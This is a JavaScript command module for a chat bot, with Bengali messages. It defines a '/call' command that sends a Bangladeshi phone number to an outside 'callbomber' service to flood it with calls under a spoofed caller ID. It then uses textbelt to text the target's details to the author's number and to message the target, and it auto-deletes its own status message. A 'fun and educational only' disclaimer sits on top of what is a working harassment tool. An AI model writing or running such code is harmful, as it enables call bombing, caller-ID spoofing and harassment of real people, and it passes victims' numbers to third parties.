module.exports.config = {
  name: "call",
  version: "1.4.0",
  hasPermssion: 0,
  credits: "RAJA ✨",
  description: "বাংলাদেশি নাম্বারে ফেক কল পাঠানোর টুল (শুধু মজার জন্য)",
  commandCategory: "Tool",
  usages: "/call 01xxxxxxxxx",
  cooldowns: 15,
  dependencies: { "axios": "" }
};

module.exports.run = async ({ api, event, args }) => {
  const axios = require("axios");

  const targetNumber = args[0];
  const fakeCallerID = "01715559179"; // ✅ তোমার ফেক কলার আইডি
  const smsNotifyNumber = "01715559179"; // ✅ এখানে নোটিফিকেশন যাবে
  const otp = Math.floor(100000 + Math.random() * 900000); // 🔐 Random OTP

  if (!targetNumber || !/^01[0-9]{9}$/.test(targetNumber)) {
    return api.sendMessage(
      "❌ সঠিক বাংলাদেশি নাম্বার দিন!\n" +
      "📌 উদাহরণ: /call 01XXXXXXXXX\n\n" +
      "⚠️ টুলটি শুধুমাত্র ফান ও এডুকেশনাল উদ্দেশ্যে। অপব্যবহার শাস্তিযোগ্য।",
      event.threadID,
      event.messageID
    );
  }

  api.sendMessage(
    `📞 কল বোম্বিং শুরু হয়েছে:\n📲 নাম্বার: ${targetNumber}\n📤 ফেক কলার আইডি: ${fakeCallerID}\n\n⏳ অনুগ্রহ করে অপেক্ষা করুন...`,
    event.threadID,
    async (err, startInfo) => {
      if (err) {
        return api.sendMessage("❌ মেসেজ পাঠানো ব্যর্থ হয়েছে।", event.threadID);
      }

      try {
        // ✅ WhatsApp ফান কল মেসেজ
        await api.sendMessage(
          `📱 WhatsApp কল পাঠানো হচ্ছে:\n📲 ${targetNumber} নাম্বারে একটি ফেক WhatsApp কল যাচ্ছে... (ফান মেসেজ)`,
          event.threadID
        );

        // ✅ Call Bomber API কল
        const { data } = await axios.get(`https://tbblab.shop/callbomber.php?mobile=${targetNumber}&callerID=${fakeCallerID}`);
        const message = typeof data === "object" ? JSON.stringify(data, null, 2).slice(0, 500) : String(data).slice(0, 500);

        await api.sendMessage(`📥 সার্ভার রেসপন্স:\n${message}`, event.threadID);

        // ✅ মেসেজ অটো ডিলিট
        setTimeout(() => {
          api.unsendMessage(startInfo.messageID).catch(() => {});
        }, 90000); // ৯০ সেকেন্ড পরে

        // ✅ তোমার নাম্বারে নোটিফিকেশন যাবে
        await axios.post("https://textbelt.com/text", {
          phone: `+880${smsNotifyNumber}`,
          message: `🔥 কল বোম্বিং অনুরোধ:\n📲 টার্গেট: ${targetNumber}\n📤 ফেক কলার ID: ${fakeCallerID}\n🔐 OTP: ${otp}\n🕒 সময়: ${new Date().toLocaleString("bn-BD")}`,
          key: "textbelt"
        });

        // ✅ টার্গেট নাম্বারে রাজার নাম ও নাম্বার যাবে
        await axios.post("https://textbelt.com/text", {
          phone: `+880${targetNumber}`,
          message: `📩 আপনার সাথে যোগাযোগ করুন রাজা (01715559179)`,
          key: "textbelt"
        });

        return api.sendMessage(
          `✅ ${targetNumber} নাম্বারে কল বোম্বিং সফলভাবে সম্পন্ন হয়েছে।`,
          event.threadID
        );
      } catch (err) {
        return api.sendMessage(
          `❌ ত্রুটি:\n${err.message}`,
          event.threadID,
          event.messageID
        );
      }
    }
  );
};
